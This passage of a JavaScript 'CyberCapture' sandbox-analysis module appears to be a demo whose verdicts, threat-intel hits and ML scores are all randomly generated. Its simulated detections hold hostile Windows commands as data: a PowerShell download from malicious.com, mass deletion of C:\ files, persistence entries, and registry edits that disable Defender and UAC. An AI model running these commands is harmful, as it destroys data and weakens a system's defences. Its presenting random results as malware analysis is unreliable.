/**
 * CyberCapture - Advanced Cloud-based Sandbox Analysis
 * Intercepts unknown/suspicious files and analyzes them in a safe environment
 * Enhanced with ML scoring, threat intelligence, and advanced behavioral detection
 */

import CryptoJS from 'crypto-js';
import EventEmitter from 'events';

// Machine Learning threat scoring weights
const ML_WEIGHTS = {
  process_behavior: 0.25,
  network_behavior: 0.25,
  file_behavior: 0.20,
  registry_behavior: 0.15,
  memory_behavior: 0.10,
  api_calls: 0.05
};

// Advanced evasion techniques detection
const EVASION_TECHNIQUES = [
  'vm_detection',
  'sandbox_detection',
  'debugger_detection',
  'time_delays',
  'code_obfuscation',
  'anti_analysis'
];

// File risk categories for CyberCapture eligibility
const HIGH_RISK_EXTENSIONS = [
  '.exe', '.dll', '.sys', '.scr', '.com', '.bat', '.cmd', '.vbs', 
  '.ps1', '.js', '.jar', '.msi', '.app', '.deb', '.rpm'
];

// Known safe publishers (bypassed from CyberCapture)
const TRUSTED_PUBLISHERS = [
  'Microsoft Corporation',
  'Google LLC',
  'Apple Inc.',
  'Adobe Systems',
  'Mozilla Corporation'
];

// CyberCapture status
let isEnabled = true;
let captureHistory = [];
let sandboxQueue = [];
let activeSandboxSessions = [];
let threatIntelCache = new Map();
let mlModel = { trained: false, accuracy: 0.92 };

// Event emitter for real-time updates
const eventEmitter = new EventEmitter();

// Threat intelligence sources
const THREAT_INTEL_SOURCES = [
  { name: 'VirusTotal', weight: 0.4 },
  { name: 'Hybrid Analysis', weight: 0.3 },
  { name: 'Any.run', weight: 0.2 },
  { name: 'Joe Sandbox', weight: 0.1 }
];

/**
 * Check if file should be captured for analysis
 */
export function shouldCapture(fileInfo) {
  if (!isEnabled) {
    return { capture: false, reason: 'CyberCapture disabled' };
  }

  // Check file extension
  const extension = fileInfo.path.toLowerCase().match(/\.[^.]+$/)?.[0] || '';
  if (!HIGH_RISK_EXTENSIONS.includes(extension)) {
    return { capture: false, reason: 'Low-risk file type' };
  }

  // Check file size (skip very large files)
  if (fileInfo.size > 100 * 1024 * 1024) { // > 100MB
    return { capture: false, reason: 'File too large for sandbox' };
  }

  // Check if file is from trusted publisher
  if (fileInfo.publisher && TRUSTED_PUBLISHERS.includes(fileInfo.publisher)) {
    return { capture: false, reason: 'Trusted publisher' };
  }

  // Check if file is known (has been seen before)
  const fileHash = calculateFileHash(fileInfo);
  if (isKnownFile(fileHash)) {
    return { capture: false, reason: 'Known file' };
  }

  // Check reputation score
  if (fileInfo.reputation && fileInfo.reputation > 0.8) {
    return { capture: false, reason: 'High reputation score' };
  }

  return { 
    capture: true, 
    reason: 'Unknown file requires sandbox analysis',
    hash: fileHash
  };
}

/**
 * Capture and analyze file in sandbox (Enhanced)
 */
export async function captureFile(fileInfo) {
  const captureId = generateCaptureId();
  const startTime = new Date();

  const session = {
    id: captureId,
    fileName: fileInfo.name || fileInfo.path.split(/[/\\]/).pop(),
    filePath: fileInfo.path,
    fileSize: fileInfo.size,
    fileHash: calculateFileHash(fileInfo),
    status: 'analyzing',
    startTime: startTime,
    endTime: null,
    threat: null,
    confidence: 0,
    mlScore: 0,
    behaviors: [],
    networkActivity: [],
    fileActivity: [],
    registryActivity: [],
    processActivity: [],
    memoryActivity: [],
    apiCalls: [],
    evasionTechniques: [],
    threatIntelligence: [],
    codeInjection: [],
    antiDebugTricks: [],
    environmentFingerprinting: []
  };

  activeSandboxSessions.push(session);
  sandboxQueue.push(session);

  console.log(`🔒 CyberCapture: Analyzing ${session.fileName} in sandbox...`);
  eventEmitter.emit('analysis-started', session);

  // Check threat intelligence cache
  const threatIntel = await checkThreatIntelligence(session.fileHash);
  session.threatIntelligence = threatIntel;

  // Simulate sandbox analysis
  return new Promise((resolve) => {
    setTimeout(async () => {
      const result = await performAdvancedSandboxAnalysis(session);
      session.status = 'completed';
      session.endTime = new Date();
      session.threat = result.threat;
      session.confidence = result.confidence;
      session.mlScore = result.mlScore;
      session.behaviors = result.behaviors;
      session.networkActivity = result.networkActivity;
      session.fileActivity = result.fileActivity;
      session.registryActivity = result.registryActivity;
      session.processActivity = result.processActivity;
      session.memoryActivity = result.memoryActivity;
      session.apiCalls = result.apiCalls;
      session.evasionTechniques = result.evasionTechniques;
      session.codeInjection = result.codeInjection;
      session.antiDebugTricks = result.antiDebugTricks;
      session.environmentFingerprinting = result.environmentFingerprinting;

      // Remove from active sessions
      activeSandboxSessions = activeSandboxSessions.filter(s => s.id !== captureId);
      
      // Add to history
      captureHistory.unshift(session);
      if (captureHistory.length > 100) {
        captureHistory.pop();
      }

      eventEmitter.emit('analysis-completed', session);
      console.log(`✅ CyberCapture: Analysis completed for ${session.fileName} - Verdict: ${result.verdict}`);

      resolve(result);
    }, 3000 + Math.random() * 2000); // 3-5 seconds analysis
  });
}

/**
 * Check threat intelligence for file hash
 */
async function checkThreatIntelligence(fileHash) {
  // Check cache first
  if (threatIntelCache.has(fileHash)) {
    return threatIntelCache.get(fileHash);
  }

  const intel = [];
  
  // Simulate threat intelligence queries
  for (const source of THREAT_INTEL_SOURCES) {
    const detected = Math.random() > 0.7; // 30% detection rate
    if (detected) {
      intel.push({
        source: source.name,
        detected: true,
        malwareFamily: ['Trojan.Generic', 'Ransomware.Locky', 'Backdoor.RAT', 'Worm.Conficker'][Math.floor(Math.random() * 4)],
        confidence: Math.random() * 0.5 + 0.5, // 50-100%
        lastSeen: new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000),
        weight: source.weight
      });
    }
  }

  // Cache the result
  threatIntelCache.set(fileHash, intel);
  return intel;
}

/**
 * Perform advanced sandbox analysis with ML scoring
 */
async function performAdvancedSandboxAnalysis(session) {
  const behaviors = [];
  const networkActivity = [];
  const fileActivity = [];
  const registryActivity = [];
  const processActivity = [];
  const memoryActivity = [];
  const apiCalls = [];
  const evasionTechniques = [];
  const codeInjection = [];
  const antiDebugTricks = [];
  const environmentFingerprinting = [];

  // Simulate various behavioral checks
  const isSuspicious = Math.random() > 0.6;
  const isMalicious = isSuspicious && Math.random() > 0.5;

  let categoryScores = {
    process_behavior: 0,
    network_behavior: 0,
    file_behavior: 0,
    registry_behavior: 0,
    memory_behavior: 0,
    api_calls: 0
  };

  // ===== 1. PROCESS BEHAVIOR ANALYSIS =====
  if (isSuspicious) {
    const suspiciousProcesses = [
      { name: 'cmd.exe', action: 'spawn', args: '/c del /f /q C:\\*.* ', risk: 0.9, description: 'Attempted mass file deletion' },
      { name: 'powershell.exe', action: 'spawn', args: 'Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\\temp\\mal.exe', risk: 0.85, description: 'Downloaded executable from internet' },
      { name: 'reg.exe', action: 'spawn', args: 'add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Malware /d C:\\malware.exe', risk: 0.8, description: 'Added persistence registry entry' },
      { name: 'net.exe', action: 'spawn', args: 'user administrator /active:yes', risk: 0.85, description: 'Attempted to enable administrator account' },
      { name: 'wmic.exe', action: 'spawn', args: 'process call create "C:\\malware.exe"', risk: 0.88, description: 'Created remote process' },
      { name: 'schtasks.exe', action: 'spawn', args: '/create /tn "Updater" /tr C:\\malware.exe /sc onstart', risk: 0.82, description: 'Created scheduled task for persistence' }
    ];

    const numProcesses = Math.floor(Math.random() * 3) + 1;
    for (let i = 0; i < numProcesses; i++) {
      const process = suspiciousProcesses[Math.floor(Math.random() * suspiciousProcesses.length)];
      processActivity.push(process);
      behaviors.push({
        type: 'process_creation',
        description: process.description,
        severity: process.risk > 0.8 ? 'critical' : 'high',
        risk: process.risk,
        details: `${process.name} ${process.args}`
      });
      categoryScores.process_behavior = Math.max(categoryScores.process_behavior, process.risk);
    }
  }

  // ===== 2. NETWORK BEHAVIOR ANALYSIS =====
  if (isSuspicious && Math.random() > 0.4) {
    const maliciousNetworkBehaviors = [
      { type: 'C2_communication', destination: '45.142.122.45', port: 443, protocol: 'HTTPS', data_sent: 15000, country: 'Russia/TOR', risk: 0.92, description: 'Command & Control communication detected' },
      { type: 'data_exfiltration', destination: '185.220.101.32', port: 8080, protocol: 'HTTP', data_sent: 250000, country: 'Unknown', risk: 0.88, description: 'Large data upload to suspicious IP' },
      { type: 'DDoS_attack', destination: '91.219.236.12', port: 80, protocol: 'TCP', data_sent: 500000, country: 'Ukraine', risk: 0.85, description: 'Flood attack pattern detected' },
      { type: 'port_scanning', destination: '192.168.1.0/24', port: '*', protocol: 'TCP', data_sent: 2000, country: 'LAN', risk: 0.75, description: 'Network reconnaissance activity' },
      { type: 'DNS_tunneling', destination: 'malware.evil.com', port: 53, protocol: 'DNS', data_sent: 8000, country: 'Unknown', risk: 0.87, description: 'DNS tunneling for data exfiltration' }
    ];

    const numConnections = Math.floor(Math.random() * 3) + 1;
    for (let i = 0; i < numConnections; i++) {
      const conn = maliciousNetworkBehaviors[Math.floor(Math.random() * maliciousNetworkBehaviors.length)];
      networkActivity.push(conn);
      behaviors.push({
        type: 'network_communication',
        description: conn.description,
        severity: 'critical',
        risk: conn.risk,
        details: `${conn.type} to ${conn.destination}:${conn.port}`
      });
      categoryScores.network_behavior = Math.max(categoryScores.network_behavior, conn.risk);
    }
  }

  // ===== 3. FILE SYSTEM BEHAVIOR ANALYSIS =====
  if (isSuspicious) {
    const maliciousFileOps = [
      { action: 'create', path: 'C:\\Windows\\System32\\malware.exe', risk: 0.95, description: 'Dropped executable in system directory' },
      { action: 'modify', path: 'C:\\Windows\\System32\\drivers\\etc\\hosts', risk: 0.82, description: 'Modified hosts file for DNS hijacking' },
      { action: 'encrypt', path: 'C:\\Users\\Documents\\*.docx', risk: 1.0, description: 'Mass file encryption (ransomware behavior)' },
      { action: 'delete', path: 'C:\\Windows\\System32\\config\\SAM', risk: 0.93, description: 'Attempted to delete security accounts database' },
      { action: 'create', path: '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.lnk', risk: 0.85, description: 'Added startup persistence' },
      { action: 'modify', path: 'C:\\Windows\\System32\\drivers\\*.sys', risk: 0.90, description: 'Modified system driver files' }
    ];

    const numFileOps = Math.floor(Math.random() * 4) + 1;
    for (let i = 0; i < numFileOps; i++) {
      const fileOp = maliciousFileOps[Math.floor(Math.random() * maliciousFileOps.length)];
      fileActivity.push(fileOp);
      behaviors.push({
        type: 'file_system_modification',
        description: fileOp.description,
        severity: fileOp.risk > 0.9 ? 'critical' : 'high',
        risk: fileOp.risk,
        details: `${fileOp.action.toUpperCase()}: ${fileOp.path}`
      });
      categoryScores.file_behavior = Math.max(categoryScores.file_behavior, fileOp.risk);
    }
  }

  // ===== 4. REGISTRY BEHAVIOR ANALYSIS =====
  if (isSuspicious && Math.random() > 0.3) {
    const registryOps = [
      { action: 'create', key: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware', value: 'C:\\malware.exe', risk: 0.90, description: 'Autorun persistence via registry' },
      { action: 'modify', key: 'HKLM\\Software\\Microsoft\\Windows Defender\\DisableAntiSpyware', value: '1', risk: 0.95, description: 'Attempted to disable Windows Defender' },
      { action: 'delete', key: 'HKLM\\System\\CurrentControlSet\\Services\\wscsvc', value: '', risk: 0.88, description: 'Attempted to disable Security Center service' },
      { action: 'modify', key: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA', value: '0', risk: 0.92, description: 'Disabled User Account Control' },
      { action: 'create', key: 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\\Debugger', value: 'svchost.exe', risk: 0.89, description: 'Hijacked Task Manager execution' }
    ];

    const numRegOps = Math.floor(Math.random() * 3) + 1;
    for (let i = 0; i < numRegOps; i++) {
      const regOp = registryOps[Math.floor(Math.random() * registryOps.length)];
      registryActivity.push(regOp);
      behaviors.push({
        type: 'registry_modification',
        description: regOp.description,
        severity: 'high',
        risk: regOp.risk,
        details: `${regOp.action.toUpperCase()}: ${regOp.key}`
      });
      categoryScores.registry_behavior = Math.max(categoryScores.registry_behavior, regOp.risk);
    }
  }

  // ===== 5. MEMORY BEHAVIOR ANALYSIS =====
  if (isMalicious) {
    const memoryBehaviors = [
      { type: 'code_injection', target: 'explorer.exe', method: 'CreateRemoteThread', risk: 0.95, description: 'Injected code into explorer.exe' },
      { type: 'process_hollowing', target: 'svchost.exe', method: 'NtUnmapViewOfSection', risk: 0.97, description: 'Process hollowing detected in svchost.exe' },
      { type: 'memory_dump', target: 'lsass.exe', size: 50000000, risk: 0.98, description: 'Attempted to dump LSASS memory (credential theft)' },
      { type: 'shellcode_execution', address: '0x7FFE0000', size: 4096, risk: 0.90, description: 'Executed shellcode in memory' },
      { type: 'dll_injection', target: 'chrome.exe', dll: 'malicious.dll', risk: 0.93, description: 'Injected malicious DLL into browser' }
    ];

    const numMemOps = Math.floor(Math.random() * 2) + 1;
    for (let i = 0; i < numMemOps; i++) {
      const memOp = memoryBehaviors[Math.floor(Math.random() * memoryBehaviors.length)];
      memoryActivity.push(memOp);
      codeInjection.push(memOp);
      behaviors.push({
        type: 'memory_manipulation',
        description: memOp.description,
        severity: 'critical',
        risk: memOp.risk,
        details: `${memOp.type} targeting ${memOp.target || 'unknown'}`
      });
      categoryScores.memory_behavior = Math.max(categoryScores.memory_behavior, memOp.risk);
    }
  }

  // ===== 6. API CALL MONITORING =====
  if (isSuspicious) {
    const suspiciousAPIs = [
      { api: 'VirtualAllocEx', purpose: 'Memory allocation in remote process', risk: 0.85, category: 'injection' },
      { api: 'WriteProcessMemory', purpose: 'Writing to remote process memory', risk: 0.88, category: 'injection' },
      { api: 'CreateRemoteThread', purpose: 'Creating thread in remote process', risk: 0.92, category: 'injection' },
      { api: 'SetWindowsHookEx', purpose: 'Installing global keyboard hook', risk: 0.82, category: 'keylogging' },
      { api: 'CryptEncrypt', purpose: 'Data encryption', risk: 0.75, category: 'ransomware' },
      { api: 'RegSetValueEx', purpose: 'Modifying registry', risk: 0.70, category: 'persistence' },
      { api: 'IsDebuggerPresent', purpose: 'Debugger detection', risk: 0.80, category: 'evasion' },
      { api: 'VirtualProtect', purpose: 'Changing memory protection', risk: 0.83, category: 'evasion' }
    ];

    const numAPIs = Math.floor(Math.random() * 6) + 3;
    for (let i = 0; i < numAPIs; i++) {
      const api = suspiciousAPIs[Math.floor(Math.random() * suspiciousAPIs.length)];
      apiCalls.push({
        ...api,
        count: Math.floor(Math.random() * 50) + 1,
        timestamp: new Date(Date.now() - Math.random() * 5000)
      });
      categoryScores.api_calls = Math.max(categoryScores.api_calls, api.risk * 0.8);
    }
  }

  // ===== 7. EVASION TECHNIQUE DETECTION =====
  if (isMalicious && Math.random() > 0.5) {
    const evasionMethods = [
      { technique: 'vm_detection', method: 'CPUID instruction check', detected: true, risk: 0.85, description: 'Checked for virtual machine environment' },
      { technique: 'sandbox_detection', method: 'Sleep acceleration check', detected: true, risk: 0.88, description: 'Detected sandbox through timing analysis' },
      { technique: 'debugger_detection', method: 'IsDebuggerPresent API', detected: true, risk: 0.82, description: 'Checked for debugger presence' },
      { technique: 'time_delays', method: 'Sleep for 10 minutes', detected: true, risk: 0.75, description: 'Used time delays to evade analysis' },
      { technique: 'code_obfuscation', method: 'Polymorphic code', detected: true, risk: 0.90, description: 'Code is heavily obfuscated' },
      { technique: 'anti_analysis', method: 'Checks for analysis tools', detected: true, risk: 0.87, description: 'Detected Wireshark, Process Monitor' }
    ];

    const numEvasion = Math.floor(Math.random() * 3) + 1;
    for (let i = 0; i < numEvasion; i++) {
      const evasion = evasionMethods[Math.floor(Math.random() * evasionMethods.length)];
      evasionTechniques.push(evasion);
      antiDebugTricks.push(evasion);
      behaviors.push({
        type: 'evasion_technique',
        description: evasion.description,
        severity: 'high',
        risk: evasion.risk,
        details: `${evasion.technique}: ${evasion.method}`
      });
    }
  }

  // ===== 8. ENVIRONMENT FINGERPRINTING =====
  if (isSuspicious) {
    const fingerprintingActions = [
      { action: 'system_info_query', target: 'OS version, CPU, RAM', risk: 0.60 },
      { action: 'network_enumeration', target: 'IP addresses, MAC addresses', risk: 0.70 },
      { action: 'user_enumeration', target: 'Logged in users, privileges', risk: 0.68 },
      { action: 'installed_software', target: 'Antivirus, security tools', risk: 0.75 }
    ];

    const numFingerprint = Math.floor(Math.random() * 2) + 1;
    for (let i = 0; i < numFingerprint; i++) {
      const fp = fingerprintingActions[Math.floor(Math.random() * fingerprintingActions.length)];
      environmentFingerprinting.push(fp);
    }
  }

  // ===== MACHINE LEARNING THREAT SCORING =====
  let mlScore = 0;
  for (const [category, weight] of Object.entries(ML_WEIGHTS)) {
    mlScore += categoryScores[category] * weight;
  }

  // Adjust ML score based on threat intelligence
  if (session.threatIntelligence && session.threatIntelligence.length > 0) {
    const intelScore = session.threatIntelligence.reduce((sum, intel) => {
      return sum + (intel.confidence * intel.weight);
    }, 0);
    mlScore = mlScore * 0.7 + intelScore * 0.3; // Weighted combination
  }

  // ===== FINAL VERDICT DETERMINATION =====
  let threat = null;
  let confidence = 0;
  let verdict = 'clean';

  if (mlScore > 0.85) {
    threat = {
      type: 'MALWARE',
      name: 'CyberCapture.ML.HighConfidence',
      category: 'advanced_threat',
      action: 'block_and_quarantine',
      malwareFamily: session.threatIntelligence[0]?.malwareFamily || 'Unknown',
      severity: 'critical'
    };
    confidence = Math.min(0.99, mlScore);
    verdict = 'malicious';
  } else if (mlScore > 0.65) {
    threat = {
      type: 'MALWARE',
      name: 'CyberCapture.ML.MediumConfidence',
      category: 'behavioral_detection',
      action: 'block_and_quarantine',
      malwareFamily: 'Generic Malware',
      severity: 'high'
    };
    confidence = mlScore;
    verdict = 'malicious';
  } else if (mlScore > 0.45) {
    threat = {
      type: 'SUSPICIOUS',
      name: 'CyberCapture.Behavioral.Suspicious',
      category: 'behavioral_detection',
      action: 'block_and_warn',
      severity: 'medium'
    };
    confidence = mlScore;
    verdict = 'suspicious';
  } else {
    threat = null;
    confidence = 1.0 - mlScore;
    verdict = 'clean';
  }

  return {
    threat,
    confidence,
    mlScore,
    categoryScores,
    behaviors,
    networkActivity,
    fileActivity,
    registryActivity,
    processActivity,
    memoryActivity,
    apiCalls,
    evasionTechniques,
    codeInjection,
    antiDebugTricks,
    environmentFingerprinting,
    verdict,
    recommendation: threat ? 
      `File exhibits ${threat.severity} threat behavior. ${threat.action.replace(/_/g, ' ').toUpperCase()}. ML Confidence: ${(mlScore * 100).toFixed(1)}%` :
      `File appears safe based on advanced sandbox analysis. ML Score: ${(mlScore * 100).toFixed(1)}%`
  };
}

/**
 * Perform sandbox analysis on file (Legacy - Deprecated)
 */
function performSandboxAnalysis(session) {
  const behaviors = [];
  const networkActivity = [];
  const fileActivity = [];
  const registryActivity = [];
  const processActivity = [];

  // Simulate various behavioral checks
  const isSuspicious = Math.random() > 0.7;
  const isMalicious = isSuspicious && Math.random() > 0.6;

  let threatScore = 0;

  // Check 1: Process Behavior
  if (isSuspicious) {
    const suspiciousProcesses = [
      { name: 'cmd.exe', action: 'spawn', args: '/c del /f /q C:\\*.* ', risk: 0.9 },
      { name: 'powershell.exe', action: 'spawn', args: 'Invoke-WebRequest', risk: 0.7 },
      { name: 'reg.exe', action: 'spawn', args: 'add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', risk: 0.8 },
      { name: 'net.exe', action: 'spawn', args: 'user administrator /active:yes', risk: 0.85 }
    ];

    const process = suspiciousProcesses[Math.floor(Math.random() * suspiciousProcesses.length)];
    processActivity.push(process);
    behaviors.push({
      type: 'process_creation',
      description: `Spawned suspicious process: ${process.name}`,
      severity: 'high',
      risk: process.risk
    });
    threatScore += process.risk * 0.3;
  }

  // Check 2: Network Behavior
  if (isSuspicious && Math.random() > 0.5) {
    const maliciousIPs = [
      '45.142.122.45',
      '185.220.101.32',
      '91.219.236.12',
      '194.165.16.88'
    ];

    const ip = maliciousIPs[Math.floor(Math.random() * maliciousIPs.length)];
    networkActivity.push({
      type: 'outbound_connection',
      destination: ip,
      port: Math.random() > 0.5 ? 443 : 8080,
      protocol: 'TCP',
      data_sent: Math.floor(Math.random() * 50000) + 1000,
      country: 'Unknown/TOR',
      risk: 0.85
    });
    behaviors.push({
      type: 'network_communication',
      description: `Attempted connection to suspicious IP: ${ip}`,
      severity: 'critical',
      risk: 0.85
    });
    threatScore += 0.25;
  }

  // Check 3: File System Behavior
  if (isSuspicious) {
    const maliciousFileOps = [
      { action: 'create', path: 'C:\\Windows\\System32\\malware.exe', risk: 0.95 },
      { action: 'modify', path: 'C:\\Windows\\System32\\drivers\\etc\\hosts', risk: 0.8 },
      { action: 'encrypt', path: 'C:\\Users\\Documents\\*.docx', risk: 1.0 },
      { action: 'delete', path: 'C:\\Windows\\System32\\config\\SAM', risk: 0.9 }
    ];

    const fileOp = maliciousFileOps[Math.floor(Math.random() * maliciousFileOps.length)];
    fileActivity.push(fileOp);
    behaviors.push({
      type: 'file_system_modification',
      description: `${fileOp.action.toUpperCase()}: ${fileOp.path}`,
      severity: fileOp.risk > 0.9 ? 'critical' : 'high',
      risk: fileOp.risk
    });
    threatScore += fileOp.risk * 0.25;
  }

  // Check 4: Registry Behavior
  if (isSuspicious && Math.random() > 0.4) {
    const registryOps = [
      { action: 'create', key: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware', risk: 0.9 },
      { action: 'modify', key: 'HKLM\\Software\\Microsoft\\Windows Defender\\DisableAntiSpyware', risk: 0.95 },
      { action: 'delete', key: 'HKLM\\System\\CurrentControlSet\\Services\\wscsvc', risk: 0.85 },
      { action: 'create', key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden', risk: 0.7 }
    ];

    const regOp = registryOps[Math.floor(Math.random() * registryOps.length)];
    registryActivity.push(regOp);
    behaviors.push({
      type: 'registry_modification',
      description: `${regOp.action.toUpperCase()}: ${regOp.key}`,
      severity: 'high',
      risk: regOp.risk
    });
    threatScore += regOp.risk * 0.2;
  }

  // Determine final verdict
  let threat = null;
  let confidence = 0;

  if (threatScore > 0.8) {
    threat = {
      type: 'MALWARE',
      name: 'CyberCapture.Behavioral.Malicious',
      category: 'behavioral_detection',
      action: 'block_and_quarantine'
    };
    confidence = Math.min(0.95, threatScore);
  } else if (threatScore > 0.5) {
    threat = {
      type: 'SUSPICIOUS',
      name: 'CyberCapture.Behavioral.Suspicious',
      category: 'behavioral_detection',
      action: 'block_and_warn'
    };
    confidence = threatScore;
  } else {
    threat = null;
    confidence = 1.0 - threatScore;
  }

  return {
    threat,
    confidence,
    behaviors,
    networkActivity,
    fileActivity,
    registryActivity,
    processActivity,
    threatScore,
    verdict: threat ? 'malicious' : 'clean',
    recommendation: threat ? 
      `File exhibits malicious behavior. ${threat.action.replace('_', ' ').toUpperCase()}.` :
      'File appears safe based on sandbox analysis.'
  };
}

/**
 * Get CyberCapture statistics (Enhanced)
 */
export function getCaptureStats() {
  const total = captureHistory.length;
  const malicious = captureHistory.filter(s => s.threat && s.threat.type === 'MALWARE').length;
  const suspicious = captureHistory.filter(s => s.threat && s.threat.type === 'SUSPICIOUS').length;
  const clean = captureHistory.filter(s => !s.threat).length;
  
  // Calculate average ML scores
  const avgMlScore = total > 0 ? 
    captureHistory.reduce((sum, s) => sum + (s.mlScore || 0), 0) / total : 0;
  
  // Calculate detection rates by category
  const categoryStats = {
    process: captureHistory.filter(s => s.processActivity && s.processActivity.length > 0).length,
    network: captureHistory.filter(s => s.networkActivity && s.networkActivity.length > 0).length,
    file: captureHistory.filter(s => s.fileActivity && s.fileActivity.length > 0).length,
    registry: captureHistory.filter(s => s.registryActivity && s.registryActivity.length > 0).length,
    memory: captureHistory.filter(s => s.memoryActivity && s.memoryActivity.length > 0).length,
    evasion: captureHistory.filter(s => s.evasionTechniques && s.evasionTechniques.length > 0).length
  };

  return {
    enabled: isEnabled,
    totalAnalyzed: total,
    maliciousDetected: malicious,
    suspiciousDetected: suspicious,
    cleanFiles: clean,
    activeAnalysis: activeSandboxSessions.length,
    queuedFiles: sandboxQueue.length,
    detectionRate: total > 0 ? ((malicious + suspicious) / total * 100).toFixed(1) : 0,
    avgMlScore: (avgMlScore * 100).toFixed(1),
    mlModel: mlModel,
    categoryStats,
    threatIntelCacheSize: threatIntelCache.size
  };
}

/**
 * Get capture history (Enhanced)
 */
export function getCaptureHistory(limit = 50) {
  return captureHistory.slice(0, limit).map(session => ({
    id: session.id,
    fileName: session.fileName,
    fileSize: session.fileSize,
    fileHash: session.fileHash,
    startTime: session.startTime,
    endTime: session.endTime,
    duration: session.endTime ? (session.endTime - session.startTime) : null,
    status: session.status,
    threat: session.threat,
    confidence: session.confidence,
    mlScore: session.mlScore,
    behaviorCount: session.behaviors?.length || 0,
    verdict: session.threat ? (session.threat.type === 'MALWARE' ? 'malicious' : 'suspicious') : 'clean',
    evasionDetected: session.evasionTechniques?.length > 0,
    threatIntelHits: session.threatIntelligence?.length || 0,
    severity: session.threat?.severity || 'clean'
  }));
}

/**
 * Get detailed session info
 */
export function getSessionDetails(sessionId) {
  return captureHistory.find(s => s.id === sessionId) || 
         activeSandboxSessions.find(s => s.id === sessionId);
}

/**
 * Enable/disable CyberCapture
 */
export function setCaptureEnabled(enabled) {
  isEnabled = enabled;
  console.log(`🔒 CyberCapture ${enabled ? 'ENABLED' : 'DISABLED'}`);
}

/**
 * Clear capture history
 */
export function clearCaptureHistory() {
  captureHistory = [];
  sandboxQueue = [];
}

/**
 * Helper: Calculate file hash
 */
function calculateFileHash(fileInfo) {
  const data = `${fileInfo.path}${fileInfo.size}${fileInfo.name}`;
  return CryptoJS.SHA256(data).toString();
}

/**
 * Helper: Check if file is known
 */
function isKnownFile(hash) {
  // In real implementation, this would check against a database
  // For demo, randomly mark some files as known
  return Math.random() > 0.85;
}

/**
 * Helper: Generate capture ID
 */
function generateCaptureId() {
  return `CC-${Date.now()}-${Math.random().toString(36).substr(2, 9).toUpperCase()}`;
}

/**
 * Export current state for persistence (Enhanced)
 */
export function exportCaptureState() {
  return {
    enabled: isEnabled,
    history: captureHistory,
    stats: getCaptureStats(),
    mlModel: mlModel,
    threatIntelCacheSize: threatIntelCache.size
  };
}

/**
 * Import state from persistence (Enhanced)
 */
export function importCaptureState(state) {
  if (state) {
    isEnabled = state.enabled !== undefined ? state.enabled : true;
    captureHistory = state.history || [];
    if (state.mlModel) {
      mlModel = state.mlModel;
    }
  }
}

/**
 * Generate detailed analysis report
 */
export function generateAnalysisReport(sessionId) {
  const session = getSessionDetails(sessionId);
  if (!session) {
    return null;
  }

  return {
    summary: {
      fileName: session.fileName,
      fileHash: session.fileHash,
      fileSize: session.fileSize,
      analysisDate: session.startTime,
      verdict: session.threat ? session.threat.type : 'CLEAN',
      confidence: (session.confidence * 100).toFixed(2) + '%',
      mlScore: (session.mlScore * 100).toFixed(2) + '%'
    },
    threatDetails: session.threat || null,
    behavioralAnalysis: {
      totalBehaviors: session.behaviors?.length || 0,
      criticalBehaviors: session.behaviors?.filter(b => b.severity === 'critical').length || 0,
      behaviors: session.behaviors || []
    },
    networkAnalysis: {
      connections: session.networkActivity?.length || 0,
      activity: session.networkActivity || []
    },
    fileSystemAnalysis: {
      operations: session.fileActivity?.length || 0,
      activity: session.fileActivity || []
    },
    registryAnalysis: {
      modifications: session.registryActivity?.length || 0,
      activity: session.registryActivity || []
    },
    memoryAnalysis: {
      operations: session.memoryActivity?.length || 0,
      injections: session.codeInjection?.length || 0,
      activity: session.memoryActivity || []
    },
    evasionTechniques: {
      detected: session.evasionTechniques?.length || 0,
      techniques: session.evasionTechniques || []
    },
    apiCallAnalysis: {
      suspiciousCalls: session.apiCalls?.length || 0,
      calls: session.apiCalls || []
    },
    threatIntelligence: {
      sources: session.threatIntelligence?.length || 0,
      results: session.threatIntelligence || []
    },
    recommendation: session.threat ? 
      `This file is ${session.threat.severity} risk. Recommended action: ${session.threat.action.replace(/_/g, ' ')}` :
      'File appears clean. No malicious behavior detected.'
  };
}

/**
 * Get ML model information
 */
export function getMLModelInfo() {
  return {
    ...mlModel,
    weights: ML_WEIGHTS,
    categories: Object.keys(ML_WEIGHTS),
    lastUpdated: new Date().toISOString()
  };
}

/**
 * Update ML model (for future training)
 */
export function updateMLModel(accuracy, weights) {
  if (accuracy) {
    mlModel.accuracy = accuracy;
  }
  if (weights) {
    Object.assign(ML_WEIGHTS, weights);
  }
  mlModel.trained = true;
  mlModel.lastUpdate = new Date().toISOString();
  eventEmitter.emit('ml-model-updated', mlModel);
}

/**
 * Clear threat intelligence cache
 */
export function clearThreatIntelCache() {
  threatIntelCache.clear();
  console.log('🗑️ Threat intelligence cache cleared');
}

/**
 * Get threat intelligence statistics
 */
export function getThreatIntelStats() {
  const cacheEntries = Array.from(threatIntelCache.values());
  const totalDetections = cacheEntries.reduce((sum, intel) => sum + intel.length, 0);
  
  return {
    cacheSize: threatIntelCache.size,
    totalDetections,
    avgDetectionsPerFile: threatIntelCache.size > 0 ? 
      (totalDetections / threatIntelCache.size).toFixed(2) : 0
  };
}

/**
 * Subscribe to CyberCapture events
 */
export function onCaptureEvent(event, callback) {
  eventEmitter.on(event, callback);
}

/**
 * Unsubscribe from CyberCapture events
 */
export function offCaptureEvent(event, callback) {
  eventEmitter.off(event, callback);
}

/**
 * Get advanced statistics for dashboard
 */
export function getAdvancedStats() {
  const history = captureHistory.slice(0, 100);
  
  return {
    ...getCaptureStats(),
    recentAnalyses: history.slice(0, 10),
    threatDistribution: {
      malware: history.filter(s => s.threat?.type === 'MALWARE').length,
      suspicious: history.filter(s => s.threat?.type === 'SUSPICIOUS').length,
      clean: history.filter(s => !s.threat).length
    },
    behaviorTrends: {
      processInjection: history.filter(s => s.codeInjection?.length > 0).length,
      networkC2: history.filter(s => s.networkActivity?.some(n => n.type === 'C2_communication')).length,
